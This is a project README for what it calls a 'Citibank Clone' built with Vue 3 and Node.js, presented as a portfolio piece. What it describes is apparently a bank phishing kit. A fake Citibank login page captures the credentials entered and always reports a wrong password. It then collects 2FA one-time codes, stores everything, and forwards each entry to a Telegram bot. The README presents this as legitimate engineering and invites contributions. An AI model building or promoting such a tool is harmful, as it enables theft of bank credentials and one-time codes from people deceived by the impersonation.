✅ Citibank Clone – Full Stack Vue 3 + Node.js
A complete banking authentication system with frontend Vue.js app and Node.js backend.
Features secure login flow, 2FA verification, data logging, and Telegram notifications.

![Citibank Clone](./client/public/images/citi.png)

---

## 📌 Summary

This project replicates a modern banking login experience with a complete backend system. It captures user login attempts, stores them in a database, and forwards notifications to Telegram - while maintaining a realistic frontend user experience with proper error handling and 2FA verification.
---

## ✨ Features
## Frontend

✅ Responsive Login Form with validation
✅ 2FA Verification System (email code via Formspree)
✅ Error Handling with backend integration
✅ Automatic Navigation from login to 2FA
✅ Mobile-First Design (Mobile ➜ Desktop)
✅ Vue Router navigation

## Backend

✅ Node.js REST API with Express
✅ SQLite Database for data persistence
✅ Telegram Bot Integration for real-time notifications
✅ CORS Configuration for frontend communication
✅ Error Simulation (hardcoded incorrect password)
✅ Data Logging for login attempts and OTP codes
---

## 🏗️  Project Structure
citibank-clone/
├── client/
│   ├── src/
│   │   ├── components/
│   │   ├── views/
│   │   └── router/
│   ├── package.json
│   └── vite.config.js
├── server/
│   ├── index.js
│   ├── package.json
│   ├── db.json
│   └── .env
└── README.md
└── .gitignore


## 🔄 Data Flow

User Login → Frontend captures credentials
POST to Backend → Data saved to SQLite database
Telegram Notification → Login attempt forwarded to Telegram
Error Response → Frontend shows "Incorrect password" (hardcoded)
Auto Redirect → User taken to 2FA page after 2 seconds
OTP Entry → User receives email code and enters it
OTP Logging → Backend captures OTP attempt and sends to Telegram



## 🧠 Challenge Faced & Solution

**Problem 1:**  
At first, I set up the 2FA verification code to automatically send after login — but this caused issues when users had no email filled in or tried signing out quickly. It also triggered unwanted API calls.

**Solution 1:**  
I refactored the logic to manually trigger the Formspree email only **after verifying the email field is filled** and only when the user clicks a "Send Code" button.  
This ensured smoother UX and avoided unnecessary API hits — a more scalable and user-friendly solution.

**Problem 2:**  : Frontend-Backend Integration
Problem: Coordinating error handling between Vue frontend and Node.js backend while maintaining smooth UX.

**Solution 2:**   Implemented proper async/await error handling with loading states and automatic redirects. Backend always returns errors (as required) but frontend still progresses through the flow.

**Problem 3:** Data Persistence
Problem: Needed to link login attempts with subsequent OTP entries in the database.

**Solution 3:**   Used LowDB to maintain a simple JSON database where OTP codes are appended to the most recent login entry, creating a complete user session record.

**Problem 4:** Real-time Notifications
Problem: Needed immediate notification of user attempts without breaking the application if Telegram is unavailable.

**Solution 4:**   Implemented fail-safe Telegram integration with try-catch blocks that log locally if Telegram API is unreachable.

---

## 🛠️ Technologies Used

| Category        | Technologies                             |
|----------------|------------------------------------------|
| 🖥️ Frontend     | Vue 3, Vue Router, `<script setup>`      |
| 🎨 Styling      | Tailwind CSS, Hero Icons, AOS            |
| 📦 Build Tools  | Vite                                     |
| 🧠 State Mgmt   | VueUse (`useDark`, `useToggle`, etc.)    |
| 💌 Email        | Formspree (for sending 2FA codes)        |
| 🔧 Backend      | Node.js, Express.js                      |
| 💾 Database     | LowDB (JSON-based)                       |
| 📱 Notifications | Telegram Bot API                         |
| 🌐 HTTP Client  | Axios                                    |
| 🌍 Deployment   | Vercel (Frontend & Backend)              |



---


## 🚀 Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/yourusername/project-dashboard.git



## 📡 API Endpoints
| Method         | Endpoint      | Description              |
|----------------|---------------|--------------------------|
|  POST          |   /api/login  | Process login credentials|
|  POST          |/api/otp       | Process OTP verification |
|  GET           | /api/health   | Health check             |



 ## 🔐 Security Features

Input Validation on both frontend and backend
CORS Configuration for secure cross-origin requests
Environment Variables for sensitive data
Error Handling without exposing system details
Data Sanitization before database storage

## 🤝 Contributing
Contributions are welcome!  
Please fork the repo and create a pull request.
1. Fork the Project  
2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)  
3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)  
4. Push to the Branch (`git push origin feature/AmazingFeature`)  
5. Open a Pull Request


## 📬 Contact
Made by @Ifedollars99
**Hamzah Taofeeq ifedolapo**  
📧 taofeeqifedollar@gmail.com  
🔗 [LinkedIn](https://www.linkedin.com/in/taofeeq-ifedolapo-7890162ba?utm_source=share&utm_campaign=share_via&utm_content=profile&utm_medium=android_app) 
| [Twitter](https://x.com/IfedollarsAvr?t=KWrkgQdZLuh7Y7xaCLCWeg&s=09)
# Ghost of the System 👻

